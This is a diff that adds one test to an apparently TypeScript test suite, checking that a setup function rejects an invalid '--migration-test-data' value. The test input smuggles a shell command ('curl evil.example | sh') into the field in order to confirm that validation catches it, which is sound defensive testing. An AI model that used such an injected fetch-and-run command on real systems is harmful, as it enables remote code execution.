@@ -2131,6 +2131,14 @@ export default defineConfig({
       );
     });
 
+    test("rejects a data kind that is neither clone nor seed, which a tampered lock could carry", async () => {
+      await expect(
+        setupTarget(
+          enabled({ migrationTestData: "clone; curl evil.example | sh" as unknown as "clone" }),
+        ),
+      ).rejects.toThrow(/Invalid --migration-test-data/);
+    });
+
     test("rejects the migration test options without --migration-test", async () => {
       await expect(
         setupTarget(
